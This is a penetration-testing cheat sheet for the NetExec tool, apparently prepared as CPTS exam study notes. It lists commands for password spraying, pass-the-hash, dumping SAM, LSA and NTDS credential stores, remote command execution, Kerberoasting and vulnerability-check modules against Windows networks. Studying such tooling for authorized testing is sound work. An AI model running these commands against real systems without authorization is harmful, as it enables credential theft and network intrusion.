---
title: "NetExec Cheat Sheet"
description: "NetExec protocols, credential flags, enumeration, dumping, execution, and modules for SMB, LDAP, WinRM, MSSQL, and more."
category: "Field Manual"
tags: ["field-manual", "cpts", "netexec", "smb", "ldap"]
date: 2026-11-11
published: true
status: archive
---

# NetExec (nxc)

NetExec (formerly CrackMapExec) validates credentials and executes commands across many protocols. It is one of the highest-ROI tools for CPTS.

## Syntax

```bash
nxc <protocol> <target> [options]
```

Protocols: `smb`, `ldap`, `winrm`, `mssql`, `rdp`, `ssh`, `ftp`, `vnc`, `wmi`.

```bash
nxc smb 10.10.10.10 -u user -p pass
nxc smb 10.10.10.0/24 -u user -p pass
nxc smb hosts.txt -u user -p pass
```

## Credentials

| Flag | Meaning |
|---|---|
| `-u user` | Username |
| `-p pass` | Password |
| `-H hash` | NT hash |
| `-d domain` | Domain |
| `--local-auth` | Local account |
| `--continue-on-success` | Keep trying after a success |
| `--no-bruteforce` | Pair users/passwords by line |
| `-t 10` | Threads |
| `--timeout 10` | Timeout |

```bash
nxc smb $IP -u users.txt -p passwords.txt --continue-on-success
nxc smb $IP -u users.txt -p passwords.txt --no-bruteforce
nxc smb $IP -u Administrator -H $NTHASH --local-auth
```

## SMB

```bash
nxc smb $IP -u "$USER" -p "$PASS" -d $DOMAIN --shares
nxc smb $IP -u "$USER" -p "$PASS" --users --groups --computers
nxc smb $IP -u "$USER" -p "$PASS" --sessions --loggedon-users
nxc smb $IP -u "$USER" -p "$PASS" --pass-pol
nxc smb $IP -u '' -p '' --rid-brute 10000
nxc smb $IP -u "$USER" -p "$PASS" --sam
nxc smb $IP -u "$USER" -p "$PASS" --lsa
nxc smb $DC_IP -u "$USER" -p "$PASS" --ntds
nxc smb $IP -u "$USER" -p "$PASS" -x "whoami"
nxc smb $IP -u "$USER" -p "$PASS" -X "Get-Process"
```

Relay list:

```bash
nxc smb 10.10.10.0/24 -u "$USER" -p "$PASS" --gen-relay-list relay.txt
```

## LDAP

```bash
nxc ldap $DC_IP -u "$USER" -p "$PASS" -d $DOMAIN --users
nxc ldap $DC_IP -u "$USER" -p "$PASS" -d $DOMAIN --groups
nxc ldap $DC_IP -u "$USER" -p "$PASS" -d $DOMAIN --computers
nxc ldap $DC_IP -u "$USER" -p "$PASS" -d $DOMAIN --kerberoasting kerberoast.txt
nxc ldap $DC_IP -u "$USER" -p "$PASS" -d $DOMAIN --asreproast asrep.txt
nxc ldap $DC_IP -u "$USER" -p "$PASS" -d $DOMAIN --trusted-for-delegation
nxc ldap $DC_IP -u "$USER" -p "$PASS" -d $DOMAIN --query "(objectClass=user)" "sAMAccountName"
```

## WinRM

```bash
nxc winrm $IP -u "$USER" -p "$PASS"
nxc winrm $IP -u "$USER" -p "$PASS" -x "whoami"
nxc winrm $IP -u "$USER" -H "$NTHASH" -x "whoami"
```

## MSSQL

```bash
nxc mssql $IP -u "$USER" -p "$PASS" -q "SELECT @@version"
nxc mssql $IP -u sa -p "$PASS" --local-auth -q "SELECT name FROM sys.databases"
nxc mssql $IP -u "$USER" -p "$PASS" -x "whoami"
```

## RDP, SSH, FTP

```bash
nxc rdp $IP -u "$USER" -p "$PASS"
nxc ssh $IP -u "$USER" -p "$PASS"
nxc ftp $IP -u "$USER" -p "$PASS"
```

RDP support is mainly credential validation, not interactive sessions.

## Modules

List:

```bash
nxc smb -L
nxc ldap -L
```

Run:

```bash
nxc smb $IP -u "$USER" -p "$PASS" -M gpp_password
nxc smb $IP -u "$USER" -p "$PASS" -M gpp_autologin
nxc smb $IP -u "$USER" -p "$PASS" -M spider_plus -o DOWNLOAD_FLAG=True
nxc smb $IP -u '' -p '' -M ms17-010
nxc smb $IP -u "$USER" -p "$PASS" -M enum_av
nxc smb $IP -u "$USER" -p "$PASS" -M laps
nxc ldap $DC_IP -u "$USER" -p "$PASS" -M adcs
```

Useful modules:

| Module | Purpose |
|---|---|
| `gpp_password` | GPP `cpassword` in SYSVOL |
| `gpp_autologin` | GPP autologon credentials |
| `spider_plus` | Spider shares and download files |
| `ms17-010` | EternalBlue check |
| `enum_av` | Installed AV/EDR |
| `laps` | LAPS password readability |
| `adcs` | AD CS enumeration |
| `zerologon` | CVE-2020-1472 check |
| `printnightmare` | Print spooler check |
| `sccm` | SCCM enumeration |

## Output and logging

```bash
nxc smb $IP -u "$USER" -p "$PASS" --shares --log logs/nxc.log
```

`~/.nxc/logs/` stores per-host logs by default. Keep them for the report.

## Tips

- Validate one credential against many hosts before spraying many credentials.
- `--continue-on-success` is essential for password spraying.
- Use `--local-auth` for local accounts; domain auth fails otherwise.
- `Pwn3d!` means local admin on SMB/WinRM.
- NetExec's interpretation can differ from the protocol; confirm critical findings manually.
- Do not run `--ntds` against non-DCs.

## References

- [NetExec wiki](https://www.netexec.wiki/)
- [NetExec GitHub](https://github.com/Pennyw0rth/NetExec)
- [NetExec modules](https://www.netexec.wiki/modules)
